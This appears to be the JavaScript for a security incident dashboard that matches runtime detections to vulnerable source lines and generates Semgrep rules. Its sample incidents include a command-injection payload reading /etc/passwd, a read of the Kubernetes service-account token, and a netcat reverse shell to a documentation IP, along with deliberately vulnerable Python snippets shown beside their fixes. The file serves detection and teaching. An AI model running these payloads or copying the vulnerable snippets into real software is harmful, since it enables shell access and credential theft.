const incidents = [
  {
    id: "inc-9fa1",
    severity: "CRITICAL",
    title: "Terminal shell spawned in production container",
    summary: "Falco observed an interactive shell from a request-controlled subprocess.",
    syscall: "execve",
    file: "sample_workload/app.py:36",
    fn: "diagnostic_ping()",
    owasp: "A03 · CWE-78",
    score: 85,
    verdict: "confirmed",
    payload: "sh -c ping -c 1 127.0.0.1; cat /etc/passwd",
    vulnerable: '34  @app.get("/ping")\n35  def diagnostic_ping(host: str):\n36      os.system(f"ping -c 1 {host}")',
    safe: '34  @app.get("/ping")\n35  def diagnostic_ping(host: str):\n36      validate_host(host)\n37      subprocess.run(["ping", "-c", "1", host],\n38                     check=True, shell=False)',
    sink: "os.system"
  },
  {
    id: "inc-b7e2",
    severity: "ERROR",
    title: "Kubernetes service-account token read",
    summary: "A container process opened the mounted service-account token after receiving untrusted input.",
    syscall: "openat",
    file: "app/src/main.py:84",
    fn: "verify_api_token()",
    owasp: "A01 · CWE-22",
    score: 90,
    verdict: "confirmed",
    payload: "python -c open('/var/run/secrets/kubernetes.io/serviceaccount/token')",
    vulnerable: '82  def verify_api_token(token_path: str):\n83      path = request.args.get("path")\n84      return open(path).read()',
    safe: '82  def verify_api_token(token_path: str):\n83      path = Path(token_path).resolve()\n84      ensure_allowed_secret(path)\n85      return path.read_text()',
    sink: "open"
  },
  {
    id: "inc-c221",
    severity: "CRITICAL",
    title: "Outbound reverse-shell connection",
    summary: "A subprocess opened an external C2 socket and handed it an interactive shell.",
    syscall: "connect",
    file: "sample_workload/app.py:36",
    fn: "diagnostic_ping()",
    owasp: "A10 · CWE-918",
    score: 100,
    verdict: "confirmed",
    payload: "nc 198.51.100.1 4444 -e /bin/sh",
    vulnerable: '34  def diagnostic_ping(host: str):\n35      command = request.query_params.get("cmd")\n36      subprocess.Popen(command, shell=True)',
    safe: '34  def diagnostic_ping(host: str):\n35      host = validate_host(host)\n36      subprocess.run(["ping", "-c", "1", host],\n37                     shell=False, check=True)',
    sink: "subprocess.Popen"
  },
  {
    id: "inc-d044",
    severity: "WARNING",
    title: "Dormant server-side request forgery sink",
    summary: "Static analysis found a request sink, but no matching runtime syscall has been observed.",
    syscall: "—",
    file: "security/semgrep/tests/rules_test_suite.py:28",
    fn: "vulnerable_ssrf()",
    owasp: "A10 · CWE-918",
    score: 25,
    verdict: "static",
    payload: "Static pattern: requests.get(user_url)",
    vulnerable: '26  def vulnerable_ssrf(user_url: str):\n27      # static test fixture\n28      return requests.get(user_url)',
    safe: '26  def fetch_allowed_resource(resource_id: str):\n27      url = resolve_allowlisted_url(resource_id)\n28      return requests.get(url, timeout=5)',
    sink: "requests.get"
  }
];

let selectedId = incidents[0].id;
let activeFilter = "all";
const $ = (selector, root = document) => root.querySelector(selector);
const $$ = (selector, root = document) => [...root.querySelectorAll(selector)];

function severityClass(severity) {
  return severity === "CRITICAL" ? "" : severity.toLowerCase();
}

function renderQueue() {
  const query = $("#incident-search").value.trim().toLowerCase();
  const filtered = incidents.filter((incident) => {
    const matchesFilter = activeFilter === "all" || incident.verdict === activeFilter;
    const haystack = `${incident.title} ${incident.syscall} ${incident.file} ${incident.owasp}`.toLowerCase();
    return matchesFilter && haystack.includes(query);
  });

  $("#incident-count").textContent = filtered.length;
  $("#incident-list").innerHTML = filtered.length ? filtered.map((incident) => `
    <button class="incident-item ${incident.id === selectedId ? "active" : ""}" type="button" role="option" aria-selected="${incident.id === selectedId}" data-id="${incident.id}">
      <span class="incident-item-top">
        <span class="severity-badge ${severityClass(incident.severity)}">${incident.severity}</span>
        <span class="incident-score">${incident.score}<small>/100</small></span>
      </span>
      <h3>${incident.title}</h3>
      <p>${incident.syscall} · ${incident.file}</p>
    </button>
  `).join("") : '<div class="empty-state">No incidents match this view.</div>';

  $$(".incident-item").forEach((button) => button.addEventListener("click", () => {
    selectedId = button.dataset.id;
    renderQueue();
    renderIncident();
  }));
}

function codeLines(text, tone) {
  return text.split("\n").map((line) => {
    const [number, ...rest] = line.split("  ");
    const highlight = Number(number) >= 36 ? ` ${tone}-line` : "";
    return `<span class="line-no${highlight}">${number}</span> ${escapeHtml(rest.join("  "))}`;
  }).join("\n");
}

function escapeHtml(value) {
  return value.replace(/[&<>"]/g, (character) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[character]);
}

function generatedRule(incident) {
  return `rules:\n  - id: auto-origintrace-${incident.id}\n    message: Runtime-correlated ${incident.sink} sink detected\n    severity: ERROR\n    languages: [python]\n    mode: taint\n    pattern-sources:\n      - pattern: request.query_params.get(...)\n      - pattern: request.args.get(...)\n    pattern-sinks:\n      - pattern: ${incident.sink}(...)\n    metadata:\n      cwe: ${incident.owasp.split(" · ")[1] || "CWE-000"}\n      owasp: ${incident.owasp.split(" · ")[0]}:2021\n      origin: OriginTrace Runtime-to-Static Engine\n      incident: ${incident.id}`;
}

function renderIncident() {
  const incident = incidents.find((item) => item.id === selectedId);
  const severity = $("#detail-severity");
  severity.textContent = incident.severity;
  severity.className = `severity-badge ${severityClass(incident.severity)}`;
  $("#detail-id").textContent = incident.id;
  $("#detail-title").textContent = incident.title;
  $("#detail-summary").textContent = incident.summary;
  $("#detail-score").textContent = incident.score;
  $("#score-ring").style.setProperty("--score", incident.score);
  $("#detail-verdict").textContent = incident.verdict === "confirmed" ? "CONFIRMED EXPLOITABLE" : "STATIC ONLY";
  $("#detail-verdict").className = `verdict ${incident.verdict}`;
  $("#detail-syscall").textContent = incident.syscall;
  $("#detail-file").textContent = incident.file;
  $("#detail-function").textContent = incident.fn;
  $("#detail-owasp").textContent = incident.owasp;
  $("#detail-payload").textContent = incident.payload;
  $("#vulnerable-code code").innerHTML = codeLines(incident.vulnerable, "danger");
  $("#safe-code code").innerHTML = codeLines(incident.safe, "safe");
  $$(".trace-step").forEach((step, index) => step.classList.toggle("complete", incident.verdict === "confirmed" || index === 1));
}

function showToast(message = "Copied to clipboard") {
  const toast = $("#toast");
  toast.textContent = message;
  toast.classList.add("show");
  clearTimeout(showToast.timer);
  showToast.timer = setTimeout(() => toast.classList.remove("show"), 1800);
}

async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
    showToast();
  } catch {
    showToast("Select and copy manually");
  }
}

$$('.tab').forEach((tab) => tab.addEventListener("click", () => {
  $$(".tab").forEach((item) => item.classList.remove("active"));
  $$(".view").forEach((view) => view.classList.remove("active"));
  tab.classList.add("active");
  $(`#${tab.dataset.view}-view`).classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });
}));

$$('.filter').forEach((button) => button.addEventListener("click", () => {
  activeFilter = button.dataset.filter;
  $$(".filter").forEach((item) => item.classList.remove("active"));
  button.classList.add("active");
  renderQueue();
}));

$("#incident-search").addEventListener("input", renderQueue);
$("#refresh-button").addEventListener("click", (event) => {
  event.currentTarget.classList.add("spinning");
  setTimeout(() => {
    event.currentTarget.classList.remove("spinning");
    showToast("Evidence set refreshed");
  }, 720);
});

$$('.copy-button').forEach((button) => button.addEventListener("click", () => {
  const target = document.getElementById(button.dataset.copyTarget);
  copyText(target.innerText);
}));

const ruleDialog = $("#rule-dialog");
$("#rule-button").addEventListener("click", () => {
  const incident = incidents.find((item) => item.id === selectedId);
  $("#dialog-rule code").textContent = generatedRule(incident);
  ruleDialog.showModal();
});
$("#close-dialog").addEventListener("click", () => ruleDialog.close());
ruleDialog.addEventListener("click", (event) => {
  if (event.target === ruleDialog) ruleDialog.close();
});
$(".copy-rule").addEventListener("click", () => copyText($("#dialog-rule").innerText));

function updateLab() {
  const toggles = $$("#evidence-toggles input");
  const score = toggles.reduce((total, input) => total + (input.checked ? Number(input.dataset.weight) : 0), 0);
  const hasRuntime = toggles[0].checked;
  const hasAst = toggles[1].checked;
  $("#lab-score").textContent = score;
  const verdict = $("#lab-verdict");
  if (score >= 70 && hasRuntime && hasAst) {
    verdict.textContent = "P0 · CONFIRMED";
    verdict.style.color = "var(--acid)";
  } else if (score >= 45) {
    verdict.textContent = "P2 · INVESTIGATE";
    verdict.style.color = "var(--orange)";
  } else {
    verdict.textContent = "P3 · STATIC ONLY";
    verdict.style.color = "var(--blue)";
  }
}
$$('#evidence-toggles input').forEach((input) => input.addEventListener("change", updateLab));

$("#scan-form").addEventListener("submit", (event) => {
  event.preventDefault();
  const message = $("#scan-message");
  const authorized = $("#authorization").checked;
  const input = $("#target-url");
  let url;
  try { url = new URL(input.value); } catch { message.textContent = "Enter a complete URL beginning with https://"; return; }
  if (!authorized) { message.textContent = "Authorization confirmation is required."; return; }
  if (!["http:", "https:"].includes(url.protocol)) { message.textContent = "Only HTTP and HTTPS targets are supported."; return; }
  message.textContent = "";
  const safeUrl = url.href.replace(/[\r\n\"]+/g, "");
  $("#scan-command code").textContent = `python ScannerWebSite.py --url "${safeUrl}" --output scan-report.txt`;
  $("#command-output").hidden = false;
  $("#command-output").scrollIntoView({ behavior: "smooth", block: "nearest" });
});

renderQueue();
renderIncident();
updateLab();
